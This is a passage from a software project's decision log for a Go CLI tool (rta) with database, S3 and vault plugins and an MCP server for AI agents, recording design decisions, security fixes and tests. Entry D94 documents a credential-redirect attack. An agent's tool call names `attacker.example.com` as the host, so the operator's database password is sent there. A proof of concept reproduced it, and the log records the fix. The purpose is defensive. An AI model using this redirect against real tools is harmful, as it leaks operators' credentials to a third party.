Proven to have teeth with an unusually concrete demonstration: reverted `tunnel.go` (removing `openCeiling` entirely) and ran the equivalent call directly against a `-timeout 8s` `go test`, which fired its own deadline and dumped exactly the two goroutines actually stuck — `awaitForwarding`'s `bufio.Scanner.Scan` waiting on kubectl's stdout, and `openInstrumented`'s `cmd.Wait()` waiting on a process still spinning in its infinite loop — a real, observed hang, not an inferred one; restored, the whole package passes clean under `-race -shuffle=on`, this the tenth and final finding from the nine-dimension adversarial audit workflow closed. |
| D93 | **`s3` (§7, Wave 2) shipped: `plugins/s3`, the fourth external plugin, 11 capabilities.** Built to the conventions `pg` and `vault` already proved rather than inventing new ones: `sdk.Serve(Plugin())` for the whole `main`, a shared `connFields()` (`endpoint`/`region`/`tls`/`access-key` Config-settable, `secret-key` as `Secret`+`Local`+`EnvFallback` exactly like `pg`'s `password` and `vault`'s `token`), `classify(err, req) *view.Error` turning `minio.ErrorResponse.Code` into a coded, hinted error the same way `pg`'s reads `pgconn.PgError.Code`, and `cap()` forcing `NoPreview` on every capability including `s3.overview`. Defaults point at a local MinIO (`127.0.0.1:9000`, plain HTTP) rather than a real AWS endpoint, the same call `vault`'s `address` default makes: zero config should reach something a person can actually stand up and try, not a SaaS endpoint needing an account first. Safety classes follow `builtin/kv`'s precedent exactly rather than the HTTP verb underneath: `object.get` is **Write+`NeedsGrant`** because revealing content is the sensitive act (kv.get's own correction), `object.set` for its overwrite risk (kv.set's), `object.copy`/`rename` because both overwrite the destination, `object.rm` Destructive, and `object.presign` Write+`NeedsGrant` for *both* methods — a presigned URL is a bearer credential handed to whoever holds the link, so a `get` presign gives away read access as surely as `object.get` does, and a `put` presign gives away write access, with this call the one gated moment rather than each use of the link. `object.show` stays Read: metadata, never content. `--file` on `object.set` and `--out` on `object.get` are both `Local` for kv's mirror-image reasons — a grant to write one key does not say which of the host's files may be read into it, and a grant to reveal content does not say where on this machine it may be written. Two things §7 listed were deliberately not built: multipart (PutObject does it internally above the threshold, so there is nothing to expose) and `sync` (a many-object directory walk whose partial-completion and delete-extraneous semantics want their own design pass). One rename during the build: `s3.bucket.policy` → **`s3.policy.get`**, since `policy` was landing as the capability's *verb* (the last ID segment) — `policy.get` matches `vault.policy.get`'s established shape. `copy`/`rename`/`presign` keep their `sdktest` verb-vocabulary warnings deliberately, the D68/D82 precedent: `copy` and `rename` are `builtin/kv`'s own words for the identical operations, and no existing rta verb means "mint a time-limited bearer URL." | **A real bug that only live testing could find, and the reason this plugin was verified against a real MinIO rather than only synthetic fixtures.** `minio-go`'s `GetObject` is *lazy*: it validates the names, returns an `*Object`, and does not issue the HTTP request until the first `Read` — so the error that actually says "no such key" arrives from `io.ReadAll`/`io.Copy`, not from `GetObject`. The first draft wrapped exactly those in its own `view.Errorf("s3.object.read", …)`/`("s3.object.out", …)`, turning every real S3 error on that path — a missing key, a denied read, expired credentials — into one undifferentiated "reading bucket/key: …" with no code to switch on and no hint. Every unit test on `classify` passed the whole time, because `classify` was never reached. Caught by pointing the built binary at a real `minio/minio` container and asking for a key that does not exist. The fix routes every handler's failure through `classify`, and the regression suite now pins it three ways: one test per read path (`io.ReadAll` and `io.Copy` separately, since they had the same bug for the same reason and one fix covering both should be proven rather than assumed), plus `TestEveryHandlerClassifiesItsFailures`, which drives all ten network-reaching handlers against an `httptest.Server` that refuses everything and asserts each returns a real `s3.*` code — generalised so the next capability added here cannot quietly skip it. Proven to have teeth: reverting the `--out` fix reproduces exactly the reported symptom (`code = "s3.object.out", want s3.object.notfound`). The library's own laziness was then confirmed directly rather than inferred, with a throwaway harness printing `GetObject err=<nil>` followed by `Read err type=minio.ErrorResponse Code:"NoSuchKey"`. Everything else was verified live against that same MinIO: bucket list and `overview --detail`; the full object lifecycle (`set` inline and `--file` with a 100 KiB binary, `list`, `show`, `get`, `get --out` landing at 0600, `copy`, `rename` — source gone, destination present, original untouched); prefix and recursive listing including the common-prefix "directory" branch (`logs/` rendered as a folder with blank size/date, not a phantom zero-byte object); `policy.get` against a real bucket policy; both presign methods round-tripped through plain `curl` with no credentials (GET returning the content, PUT uploading content then read back through the plugin); `rm` refusing without `--yes`, `--dry-run` leaving the object in place, and the real delete — plus confirming S3's DELETE really is idempotent (removing an already-gone key is not an error), which is what justifies `--dry-run` not probing for existence first, since that would report a failure the real call would not. Error classification was verified against live failures too: nonexistent bucket, nonexistent key, wrong credentials, and nothing listening, each returning its own code and hint. |
| D94 | **An MCP agent could point any service plugin at a server of its own choosing, and rta would supply the operator's credential alongside it — found by a design review, reproduced end to end, closed with no contract change.** A service plugin declares the connection it talks to — `pg`'s `host`/`port`/`user`/`database`/`sslmode`, `s3`'s `endpoint`/`region`/`tls`/`access-key`, `vault`'s `address`/`namespace` — as ordinary `Config`-backed inputs, so an operator states it once and never types it again (ADR 0016). "Ordinary" also meant **published in the MCP tool schema** (`InputSchema` omits only `Local` fields, bridge.go:425), **accepted from a caller** (`validateGivenArgs` refuses only *undeclared* names, bridge.go:715), and **applied above every other source** (`plugin.Resolve` copies caller values last, above config and above the host's own `RTA_<NS>_*` environment layer, resolve.go:117). The three compose into a credential-redirect: an agent sends `{"sql":"…","host":"attacker.example.com"}`, rta connects there and fills `$RTA_PG_PASSWORD` in beside it. No grant, no `--allow-write`, no flag involved — `pg.query` is `Safety: Read`, so it is exposed by default. Proven with a throwaway PoC through the real in-memory MCP transport before anything was changed: the handler received `host="attacker.example.com"` together with the real password. **Fixed by marking every connection input `Local`**, which already means exactly "an input a remote caller may never supply" (its own doc, and resolve.go:79 says so in as many words) and whose existing precedent is `kv.get`'s `--out` — Local so an agent cannot aim a revealed secret at an arbitrary file. Choosing a destination *off* this machine is the same act as choosing one *on* it; reading `Local` narrowly is what left the hole open. The mechanism needed no new field, no `proto/v1` change and no SDK version bump: `Local` fields are omitted from the schema and stripped from incoming arguments, while config still fills them and the CLI and TUI still offer them as ordinary flags, because there is a person there and it is their machine. `EnvFallback` is deliberately *not* added to any of them — the D74 distinction: it is for values that genuinely are credentials, and a field that merely chooses a destination must never come from an ambient variable the MCP server happened to inherit. | Verified live rather than only in tests: a real `rta mcp serve` was driven over stdio with a JSON-RPC `tools/list` before and after. Before, `pg_query` advertised `host`/`port`/`user`/`database`/`sslmode` and `vault_kv_list` advertised `address`/`namespace`; after rebuilding all three plugins, **zero connection inputs remain reachable across all 18 service tools**, while every payload input (`sql`, `bucket`, `key`, `prefix`, `recursive`, `limit`, `schema`, `mount`, `path`, `name`, `id`, `detail`) is untouched — this narrows what an agent may *choose*, not what it may *do*. `rta s3 bucket list --help` still lists `--endpoint`, `--region`, `--tls` and `--access-key`, confirming the CLI is unaffected. Two layers of regression test: `internal/mcp`'s `TestAnAgentCannotChooseWhereACallGoes` pins the *mechanism* against a synthetic pg-shaped capability, so it holds for every plugin including ones that do not exist yet, and asserts the credential still arrives (this closes a redirect, it does not break authentication); and a `TestEveryConnectionInputIsLocal` in each of `pg`, `s3` and `vault` written against `connFields()` rather than a list of names, so an input added later is covered the day it is added. Both proven to have teeth: dropping `Local` from the host fixture reproduces all three symptoms (schema advertises it, the agent redirects, the credential follows), and dropping it from `vault`'s `address` fails that plugin's own guard. **Two things this does not do**, recorded because the next step depends on them: it does not give an operator a way to *name* an alternative connection — until profiles land, an agent reaches whatever the config says and nothing else, which is the fail-closed direction; and it does not make a grant target-aware, which is moot today because **no `pg` capability declares `NeedsGrant`** and all six are `Safety: Read`, so `grant.Required` is false and no `pg` call ever reaches `Reserve`. Deciding which service capabilities gain `NeedsGrant` is a prerequisite for the grant half of the profiles work, not a consequence of it. |
| D95 | **Profiles: a named connection is both the operator's fast switch and the unit an agent's permission is granted against — and naming one is itself what requires consent.** The direction came from the user: *"we want a deep management level for AI agents but we also want to be able to easily grant permissions (profile could be a good idea) so grants (and secret access) are renew easily. Quick access can help user to adopt our app and increase their security."* Designed through a nine-agent pass (three subsystem maps, three independent proposals from MVP/security/adoption angles, three judges), which converged on one clause carrying the whole feature: `Required(c, profile) = profile != "" || c.NeedsGrant || c.Safety == Destructive`. **This dissolves D94's open question rather than answering it.** The question was "should `pg.query` declare `NeedsGrant`?"; the answer is that the grant's missing axis was never the capability but *which database* — "the agent may read staging, not prod" is what an operator actually wants to say, and the old model could not express it at all. Marking pg's six capabilities `NeedsGrant` would have gated `rta pg status` against the operator's own localhost, where nothing left the machine and nobody consented to anything; the requirement belongs to the connection, so zero-config stays frictionless and consent is required exactly when a call reaches somewhere else. **`Grant.Profile` empty means the base connection and nothing else, never "any"** — `Scope`'s empty-means-every-record wildcards a record inside a connection already chosen, where this would wildcard the connection itself, which is D94's redirect rebuilt from the grant side; it is also the only reading under which the field's arrival is safe for grants already on disk, which keep covering exactly what they covered and gain nothing. Both new fields (`Profile`, `TTL`) are `omitempty`, so `canonical()` re-encodes byte-identically and every existing seal verifies (ADR 0015). **Under a profile the namespace-wide `RTA_<NS>_<INPUT>` layer is switched off entirely**, not merely overridden: that variable is bound to the plugin, so it follows the connection wherever a profile points it, and skipping only the overlap leaves D94's exact shape intact. A profile carries its own credential (`RTA_PROFILE_<NAME>_<INPUT>`, derived never declared, the D50 rule) or it carries none. **What an agent may say is one string: a name in the operator's own file** — never an address, port, user, region, TLS setting or credential, all of which stay `Local`. The names are not enumerated in the schema (an inventory handed to an ungranted caller is disclosure, and the guess-and-fail counter-argument assumes a self-service retry loop that does not exist, since only a person can issue a grant), and **unknown and ungranted return the identical refusal because the gate runs before the lookup** — otherwise the wording is an oracle for the whole inventory one call at a time. **R5**: once a namespace has profiles, an MCP call naming none is refused, chosen by the user over the softer warn-only option — without it an operator who carefully grants "staging" leaves production sitting in `plugins.pg:` reachable ungated, so adopting profiles would have improved nothing. It costs nothing until somebody writes their first profile and has no config key to turn off. `plugin.Resolve` now takes an `Inputs` struct rather than positional maps (37 call sites, all four plugin modules): the ordering *is* the security property and a swap is not something the compiler can catch. Precedence is caller → profile → env → config → default. **`profile`, not ADR 0018's `target`** — proven by adding `target` to `reservedInputs` and watching `grant.allow`, `grant.revoke` and `cert.inspect` all fail registration, i.e. `rta` would not start; and the reservation is conditional on `Profilable(c)`, because `builtin/grant` legitimately takes a profile name as *data* and an unconditional reservation would leave the command that issues profile grants unable to name one. `rta use` is CLI/TUI only and `rta mcp serve` never reads it: an agent names the profile in the call, so what a person consented to and what the call touched are the same string by construction. `grant renew` extends time and nothing else — re-running `grant allow` built a fresh grant from that invocation's flags, silently converting a `--max-uses 1` grant to unlimited and resetting the uses spent; `Issued` is deliberately not moved, so `Active()`'s existing `MaxTTL` test caps any chain of renewals at 24h from first consent for zero new code. | **Three defects found by running it rather than by reasoning about it**, each after the unit tests were green. (1) The refusal hint said `rta grant allow pg.status --ttl 15m`, which issues a grant with an empty profile and therefore authorizes nothing — a refusal that hands somebody a command that does not fix the problem is worse than one that hands them nothing, because they run it, see success, and go looking elsewhere. (2) `grant list` had no Profile column, so two grants on one capability — one for staging, one for production — rendered as identical rows on the screen whose entire job is "what may the agent do right now?"; fixing it shifted three existing assertions that indexed columns by position, which were rewritten to index by column *name* since position is a rendering detail and the name is the contract. (3) **The pin was advisory**: `rta profile list` printed "invalid" for an unpinned profile while that same profile resolved and connected, because the check lived in the report and not on the path that uses the value. That is the check it matters most for — registration is first-come and `$PATH` decides the order, so an unpinned profile hands whichever binary answered to "pg" the operator's stated connection (the finding all three design proposals missed and the security judge caught). `Lookup` now enforces it, `Check` delegates to the same `checkPin`, and a nil origin refuses every external plugin rather than waving it through. A fourth was found by teeth-proving itself: the env-layer test passed under revert because it set *both* credentials, where the profile layer wins regardless — rewritten around a profile supplying none, which is the case that matters. Every guard is teeth-proven individually: the `Required` clause, `covers()` exactness in both directions, gate-before-lookup, the env-layer skip, the `Path` and `Scope` fill rules, pin enforcement, the allow dedupe key (without `Profile` in it, `grant allow pg --profile b` silently *deleted* the grant for profile a), and renew's three invariants. Verified end to end against real plugin binaries over MCP stdio: six `pg` tools offering `['profile','sql','limit','schema']` and zero connection inputs; unprofiled refused with `core.profile.required`; ungranted and unknown byte-identical; granted reaching the profile's own host. The human path verified in the same run: base → `localhost`, `--profile prod` → `prod.db.internal`, `rta use staging` → `staging.db.internal`, and an explicit `--host` still beating the selection. Three stage-0 bugs were fixed first, in their own commits, since profiles made all three worse — see D96. Everything green under `-race -shuffle=on`, all four plugin modules included. |
| D96 | **Three defects found while mapping what a profiles block would touch, fixed first because profiles made all three worse.** (1) **`rta explain` named an environment variable that nothing reads.** D74 split `Local` ("no remote caller may supply this") from `EnvFallback` ("the host fills it from `RTA_<NS>_<INPUT>`"), and D94 then marked eleven connection inputs across `pg`, `s3` and `vault` `Local` *without* `EnvFallback` — deliberately, since a field that merely chooses a destination must not be fillable from an ambient variable. The card did not follow, printing the variable for every `Local` input, so `rta explain pg.status` told operators `--host` comes from `$RTA_PG_HOST`. Verified against all three built binaries: pg's `host`/`port`/`user`/`database`/`sslmode`, s3's `endpoint`/`region`/`tls`/`access-key` and vault's `address`/`namespace` were all false; the three genuine credentials were the only correct ones. The failure is silent in the worst place — the card is what somebody reads when a connection is *already* failing, so a fictitious variable sends them to export something that cannot help and to stop looking at the config key that would have worked. My own regression from D94, one day old. (2) **The TUI plugin-config editor wrote keys nothing reads.** An input's name and its config key are different things and nothing says they must agree: `plugins/vault` declares an input called `mount` twice, keyed `kv-mount` and `transit-mount`. `configFields` deduplicated by `Field.Name`, so the two collapsed into one box, and `capForm` binds and saves by `Field.Name`, so that box was written under `mount:` — which `plugin.Resolve` never reads, because `lookupConfig` walks `Field.Config`. The editor wrote a key nothing consumes, dropped the other mount entirely, and `rta doctor` then reported "nothing in vault reads mount" about a value rta itself had just written. Fixed by deduplicating on `Field.Config` and renaming the field to its key, after which seeding, saving and the label an operator sees are all the config key — the right label for a config editor and the only one that can tell vault's two mounts apart. (3) **It replaced the whole section on save.** `cfg.Plugins[heading] = values` wrote only what the form collected, so any other key in that section was deleted by the act of saving an unrelated field. Fixed by carrying forward exactly the keys the form did not show — deliberately *not* a plain merge, which is the obvious fix and is wrong: `capForm.values()` omits an empty text field with no declared default, so an overlay would resurrect a value the operator had just cleared. Both halves are pinned, the second by its own test, so the naive fix cannot pass. | Each fixed in its own commit ahead of the profiles work, on the standing rule that bugs outrank features. (1) is pinned by a test written against a *synthetic* capability rather than pg's declaration — what is under test is which rule the card applies, so it has to hold for plugins nobody has written yet — asserting the credential's variable is named, the destination's is not, both keep their `local (never offered to MCP callers)` marker, and the config key survives. Teeth proven by ungating the branch: the card claims `$RTA_DEMO_HOST` and the test fails. (2) and (3) are pinned separately and each teeth-proven by reverting only its own half — dedup-by-name offers `map[address mount]` and fails; whole-section-replace loses the unshown key. A fourth test guards the naive merge specifically, since that fix would pass the third test while breaking the operator's ability to clear a field. All three were confirmed empirically before being fixed — the first by running the built binary against all three plugins, the other two by reading the exact lines (`pluginconfig.go` keying by `f.Name` at `configFields`, `form.go:507` binding by `f.Name`, `resolve.go` looking up by `f.Config`) rather than inferring from the symptom. |
| D97 | **A profile is an environment, not a connection: one name across every plugin that has something in that place — and switching to one is both the fastest thing an operator does and a bound on what agents may reach.** D95 built profiles one-plugin-at-a-time and listed the multi-plugin case as "the obvious next ask… deliberately not designed for now". It was the next ask, and the reframing is the whole design: *"proj1-staging"* is not a database, it is a place, and a database is one of the things in it. So `profiles.<name>` now carries a `plugins:` block keyed exactly the way the top-level one is (`pg@1b6093cf90ce:`, `s3@7f12b8cbdf29:`) — a profile is a `plugins:` section that only applies while you are in that environment, one shape to learn rather than two, with the same validation reporting the same problems in the same words. `rta use proj1-staging` then points pg, s3 and vault at staging at once and every later command needs no flag at all; the old single-plugin shape is refused with the migration spelled out, because "plugin, which nothing reads" is technically true and useless to somebody whose file worked last release. The question D95 said this would make ambiguous — "is this one permission or two" — is answered rather than dodged: it is one, because the environment axis and the capability axis were always separate and a grant's `Target` is still what narrows to `pg`. **Three things follow, each with its own argument.** (1) **A switch carries a deadline.** `rta use x --for 2h`, or `ttl: 1h` on the profile itself so a production environment is temporary even when somebody switches to it in a hurry — including from the TUI, where switching is one keypress and there is nowhere to type a duration. Enforced on every read and never by a timer: a timer belongs to a process, and the point of a deadline on production is that it survives one, so closing the laptop must not be what keeps prod switched on. An unparseable `ttl:` is refused by both `Check` and `Lookup`, because the quiet direction is the dangerous one — an environment whose deadline does not parse is one that never switches off. (2) **An ambient switch is silent where an explicit flag is an error.** `--profile proj1-prod` on a command `pg` does not appear in is somebody asking for something that cannot happen; *being in* proj1-prod and running `rta sys disk` is not a mistake at all, and refusing there would make switching on cost every command the environment happens not to mention. A profile that says something *broken* about the plugin still fails either way — that is a statement, and running somewhere else instead is the wrong answer delivered confidently. Two functions (`Ambient` beside `Lookup`) rather than a boolean, because the difference is in what the caller is entitled to assume. (3) **Switching bounds agents, and can only ever subtract.** This supersedes D95/ADR 0019 §9's "`rta mcp serve` never reads the selection": it now reads it, for exactly one purpose — while a profile is on, a call naming any other profile is refused whatever grants exist. §9's actual argument survives intact, because the objection was to session state as an *invisible input that grants*; this one can only refuse. The agent still names the profile, the call is still filled from the name it gave, a grant is still what permits it, and the switch adds nothing, satisfies no requirement and turns no refusal into an approval — so it cannot make a person's consent and the connection actually touched disagree. What it buys is the user's own framing: *"AI agents are getting more or less capabilities given the targeted profiles"*, with `rta use --off` taking every profiled reach away in one keystroke and no grant revoked. Implemented as a **filter on the grant set inside `Reserve`** (`grant.bounded`) rather than a check beside it, which is what makes both properties structural: a call naming no profile still matches the grants that name none, because `covers()` already compares the two exactly; and the refusal comes out of the same `allocate()` over the same tally, so a bounded call and an ungranted one cannot be told apart by which scopes each names. `rta use --off` is the *absence* of the bound rather than a stronger one — grants alone decide again, which is the only sensible reading of "back to the base configuration"; `rta grant revoke --all` is the lever that takes reach away. **The dashboard is in the environment**: header badge with time remaining, tiles resolved through the switch, re-read on the refresh tick because a deadline lapsing and `rta use` in another terminal both change it without anybody touching this keyboard — but bound once per switch rather than per refresh, since resolving a `secrets:` reference can mean an scrypt derivation of about a second against a five-second refresh. **Two panes** (environments; one environment's plugins) sharing the band renderer the plugin inventory invented, because two copies of a layout become two layouts. | **Verified end to end against real plugin binaries and a real MCP session, not only through tests.** With `pg@1b6093cf90ce` and `s3@7f12b8cbdf29` on `$PATH`: an unpinned profile refused with the installed digest in the hint; `rta use proj2-prod` picking up the profile's own `ttl: 1h` unasked; `rta pg status` reaching `prod.db.internal` and then, after `rta use proj1-staging`, `staging.db.internal` — with `rta s3 bucket list` reaching `minio.staging:9000` under that same switch and `rta sys disk` (uncovered) working normally. Over real MCP stdio with grants for both environments issued: nothing switched on, both got past the gate and failed at DNS; switched on to proj1-staging, `proj2-prod` came back `core.grant.required` — the same sentence an ungranted call gets — while `proj1-staging` still ran. Both TUI panes and the header badge rendered and read. **And one hole found by a test written for something else.** `TestAmbientIsSilentWhereExplicitIsAnError` asserts that a *broken* statement about a plugin fails even ambiently, and it failed — revealing that `Lookup` resolved a profile `Check` called invalid, one layer along from the pin bug D95 already recorded. `Check` could see that `hsot: staging.db.internal` reaches nothing; `Lookup` could not, because validating a config key needs the plugin's *catalogue* and `Lookup` was handed only an `Origin` func. So a misspelled host was reported `invalid` by `rta profile list` and resolved anyway by every path that runs a command, sending the call to the plugin's **base** connection while the operator believed they were on staging — precisely the failure profiles exist to prevent, arriving through the feature itself. Fixed with `profile.Installed`, origin and catalogue as one value, so the two halves of "is this profile usable" can never again be given to different functions. The lesson now stands twice in two ADRs: a check that lives on the reporting path and not on the path that uses the value is not a check, it is a label — and the way to stop rediscovering it is to make both paths share the function. **And one the review found that the running did not, which is the more serious of the two.** The bound shipped first as a comparison in `internal/mcp` before `Reserve` — `on != "" && profileName != on` — and `profileName` is `""` for every call that names no profile, which is almost every call rta has. Switching *anything* on therefore refused all of them, blacking out the whole agent surface, with a hint telling the operator to issue grants that could not have helped because the check ran before the gate those grants feed; it was also an oracle available to an agent holding nothing, which could call an ungated capability and read "the operator has an environment switched on" off the refusal. Every test was green, and the reason is worth recording: the MCP fixture registered one namespace and every config carrying a selection declared a profile for it, so R5 refused an unprofiled call before the bound was ever consulted — the uncovered cell was exactly "selection on × call names no profile". Reproduced against a real MCP session in one command, and fixed by moving the bound *into* the gate as a filter, which removes the empty-profile case by construction rather than by remembering a condition. A second, quieter divergence went with it: the short-circuit refused with every scope the call carried while the real check names only the uncovered ones, so an agent holding a partial grant could read the operator's whereabouts off the difference. Also from the review: `rta use --off` was documented in four places as taking every profiled reach away, and does the opposite — nothing switched on means no bound — so an operator reaching for the documented lever during an incident would have *widened* an agent's reach; the prose now says what the code does and points at `rta grant revoke --all`. `profile.json` moved to 0600, `rta use` now refuses an unparseable `ttl:` the way `Lookup` already did, and `Fill`'s failure over MCP is genericised because its message names the store entry the operator mapped — which `kv.Reveal` already refuses to disclose from the other side. |
| D98 | **Every screen's footer now teaches every key that screen answers to, and a test keeps it that way.** Reported plainly: *"I don't see the profile action."* `f` opened the profiles pane from the day it was written and the dashboard footer never learned to say so, because each screen built its own hint bar at the place it painted it — so a new pane touched neither the dashboard's list nor anybody else's. A key nobody can see is a key nobody has. Rather than adding one hint, the seven scattered bar expressions became one table (`footerItems(screen)`) with every entry carrying the keys it teaches, which is what makes the guarantee testable rather than aspirational: put the model in each screen, press every key a keyboard offers, and fail on anything that does something the footer never mentions. `alias()` covers the keys somebody would try without being told (`enter` beside `c configure`) without spending a second slot in a bar that has to fit. | Writing the test found three more of the same bug immediately: `p` closed the plugin pane and `f` the profiles pane — the habit every letter shortcut trains — with only `esc back` advertised; the result pane advertised `e edit inputs` *only* once scrolled past the top while the key answered at any position, so on the pane where somebody most wants to change an input and run it again nothing said they could; and the running screen answers to `q` as well as `esc`. `r refresh` is now also conditional on there being something to re-run, matching the branch that handles it. Footers rendered at 120/100/80 columns to confirm `f profiles` survives narrowing ahead of `[ ] move` and `H hide`. |
| D99 | **A form is a display of where the call goes, and a box nobody touched is not an answer.** From the user: *"when I select a profile, every registered fields for this profile should use by default in the form (and this for any plugin)"* — and behind the request was a real divergence. `formSeed` layered declared defaults, config and the caller's values, and simply did not know about environments; so with `proj1-staging` switched on, `rta`'s own form opened showing `prod.db.internal` in the host box, the picker directly above it said `staging`, and the run went to staging. A screen that disagrees with what the next keypress does is worse than a blank one, because it is believed. The seed now takes the environment as a layer through the same `plugin.Resolve` every other surface uses, and one constructor (`runForm`) builds the picker and the seed from a single answer, so the two can never again name different environments. **Fixing it created a sharper bug and the fix for that is the interesting half.** A seeded value handed back at submit is a *caller* value, and caller beats profile by design (`--profile prod --host x` connects to x) — so changing the picker would have pinned the call to the environment the operator had just navigated away from. `capForm.displayed` drops what nobody edited, which costs nothing when nothing changed (Resolve re-derives the same value from the same layer) and is the whole correctness argument when it did. Two related divergences went with it: `resolveProfile` deleted the picker's answer out of the caller's own map, which is the map `r` re-runs and `e` reopens, so a deliberate run against prod was silently re-aimed at whatever was switched on; and credentials are excluded from the seed, because seeding a masked input paints the passphrase's length on a screen somebody may be sharing while an empty Secret box already means "the environment supplies it". Separately, and from the same message — *"couldn't we hide credential-entry when credential-source is not a reference? everything should be as natural as possible"* — the credential editor stopped showing two boxes it would not read and explaining itself with "only used when referencing one", which is a footnote standing in for a design. huh hides groups and never single fields, so `hideUnless` puts a conditional field in a group of its own; the follow-up is now the one the question above it implies, "use an environment variable" asks nothing further because there is nothing further rta can do, and a plugin with one credential is no longer asked which one. | Teeth-proven both ways rather than asserted. `TestChangingThePickerMovesTheCall` fails under revert with the exact words of the bug — *"an untouched box answered `staging.internal`"*, then *"the run would reach staging.internal, want prod.internal"* — and `TestAFormOpensOnTheSwitchedOnEnvironment` fails with `host box = "localhost"` when the profile layer is removed from `formSeed`. The drop rule is scoped by `cf.editing()`, derived from the flags each editor's own save path is already dispatched on, so an editor that forgot one would fail to save rather than silently acquire a run form's rules — pinned by `TestTheEditorsKeepUntouchedValues`. The credential form was driven by real keypresses, not by writing bindings, because a huh select writes its own value back on enter: down, enter on "use an environment variable" reaches `StateCompleted` with no second page. |
| D100 | **Completion is part of whether a control gets used, so the gaps were audited rather than guessed at.** From the user: *"we also really like to get as much completion as possible."* Four parallel agents swept the cobra surface, `builtin/`, the external plugin modules and the TUI forms; a fifth verified and ranked what came back. Two of the findings were defects rather than absences, and both made completion rta already computed unreachable. **(1) Tab did nothing.** huh binds AcceptSuggestion to `ctrl+e` and puts `tab` on "next field", while rta had been telling people to press tab since the first Path field — *"tab completes paths"* under one, *"press tab"* under the plugin picker. Every suggestion in every form was reachable only by a key nothing mentions. Tab is the completion key in every shell and every editor, which is why the docs kept saying so; the binding was the thing that was wrong. **(2) Suggestions were frozen at build time.** One `plugin.Request` was built when the form opened and baked into a static list, so `Field.Suggest` — documented to receive "what the caller has supplied so far" — never saw anything typed. `grant allow`, whose `scope` completes from whichever `target` was named, therefore offered nothing on rta's own consent surface while completing perfectly from a shell. They are recomputed per keystroke now through huh's `SuggestionsFunc`, which is why every string field needed the locked accessor only `Path` had: the function runs in a bubbletea command while huh writes on the event loop. Three smaller ones rode along: a comma-separated list completed only its first item (bubbles matches against the whole box); `Secret` and `Text` may no longer declare `Suggest` at all — refused in `Capability.validate` rather than dropped by whichever surface renders it, since a list is drawn in plain text beside a box that is masked precisely so its contents are not; and completion now runs as `SurfaceCompletion` in the TUI too, so a `Suggest` that would prompt can tell nobody is waiting. **On the CLI**, the flags nobody can be expected to type: `--allow-destructive` hands over the pinned capability ID (ADR 0015's digest, which is a lookup, and a control that costs a lookup gets left off), `--allow-write` names each namespace with how many write capabilities it opens, and `rta use --for` offers the named profile's own `ttl:` first. A command that takes no argument now offers none, rather than falling through to cobra's default of listing the working directory. And completion resolves through the switched-on environment — `Bind`, never `Fill`, the line `internal/profile` already draws — because computing candidates from the base configuration while the command would run against the environment is D99's divergence one surface along. **Nineteen plugin fields** followed, all answered from data the machine already holds. | Every completion exercised through the real binary's `__complete`, including across the plugin process boundary: `s3 object set --storage-class` and `vault wrap set --ttl` answered from freshly built external plugins. The double payoff the audit predicted showed up as stated — `net.hosts.add` declares `Scope`, so completing its `hostname` also lit up `rta grant allow net.hosts.add <tab>`, which was blank on the consent surface. Tab completion and sibling dependence are pinned by tests that drive real keypresses through `settleForm` rather than reading bindings, and `grant --ttl`'s literals are guarded against drifting from `core.DefaultTTL`/`core.MaxTTL` by a test that parses every entry it offers. **Two things deliberately not done**, both on the audit's own evidence: `audit.mail --selector`, because `mail.go` argues that guessing popular DKIM selectors turns "not at the names I tried" into a confident "no DKIM" and a list inviting the guess reintroduces that through the front door; and anything needing a live connection — s3 buckets, vault policies, pg databases — which is a network round trip per keystroke and wants a cache before it wants a list. |
| D101 | **A form that carries on from a result opens on what produced it — and the completion for the inputs nothing can enumerate comes from what the operator has actually used.** Reported plainly: *"when editing inputs to re-run, some infos of the previous command are lost (bucket in s3 plugin for example)"*. `e` built its form from the capability's declared defaults, so "edit inputs" meant type it all again; it had behaved that way since the TUI was written. The same gap is sharper one path along and silent: a row action built its form from the row's identity and nothing else, so `net hosts list --file ./container/hosts` followed by `x` on a row opened a *removal* form whose `file` box was empty — and empty means the system hosts file. The screen said container; the action would have edited the machine. Both now seed from what the view on screen ran with, split at the boundary that already existed — what no field can ask about travels as carry (the detail toggle, the environment picker), what the form does ask about goes in the boxes — and the carry stops at the plugin boundary, because an input of the same name in another namespace is a different thing and a guess that pre-fills a destructive form is not a guess to make. **This forced D99's drop rule to learn provenance.** "An untouched box is a display, not an answer" was keyed on the input being profile-fillable, which was right while only the environment seeded those boxes; now that a form can also open on values a person gave, the rule has to reach only the environment's own contribution, or a deliberate `--host` that happens to match the profile's would be dropped on the second run and the call quietly sent back to the profile's. **The completion half is a decision to *not* build the obvious thing.** The ask was *"add completion everywhere it's possible — kube, s3, db"*, and asking the service is the wrong build here for three reasons this repo had already established: the credential is deliberately absent (completion resolves a profile through `Bind`, never `Fill`, because a `secrets:` reference means an scrypt derivation and possibly a passphrase prompt mid-command-line — so a live listing authenticates with nothing for exactly the operators who use profiles); `plugins/pg` already refuses to be polled on a five-second dashboard timer and ADR 0018 §7 *measured* what a connection costs through a `kubectl port-forward`, where the default `sslmode: prefer` kills the forward on a **clean disconnect**, so a tab press would take the operator's tunnel down; and no cache can help where it matters, because every `rta __complete` is a fresh process tree. What is left is what the machine already knows. `internal/recent` keeps a per-plugin shortlist of the values this person used, offered behind whatever a field declared for itself — every input of every plugin including ones nobody has written yet, no network, no credential, no plugin change, 17 KB of binary. Keyed by namespace rather than by capability, the same assumption `Field.Config` already makes. | **The security properties are tests rather than intentions**: a Secret is never recorded and never reaches the file by any route; an agent never writes the shortlist, because a call an agent made choosing what a person is offered next is a quiet way to be steered, and the rule is enforced on the surface as a closed set so a surface added later has to be named before it can write; the file is 0600 beside the selection and the grants; and a value that would display as something other than what it is — a bidi override, an escape sequence — is **refused rather than cleaned**, because a completion entry is accepted with one keystroke and a scrubbed version would hand somebody a value that is not the one that worked (`textclean.Deceives`). All four continuation fixes are teeth-proven under revert with the words of the bug — *"an untouched box answered staging.internal"*, *"bucket box = \"\" — the removal would have gone somewhere else than the listing"*. **And writing it found a hygiene defect in the tests themselves**: running a capability now records, so the fixtures were landing in the developer's own `~/.local/share/rta` and would have come back as suggestions in their real shell. Both test packages take a data directory of their own now, set in TestMain rather than in a helper, because the rule is about the package and a helper is something a new test can forget to call. |
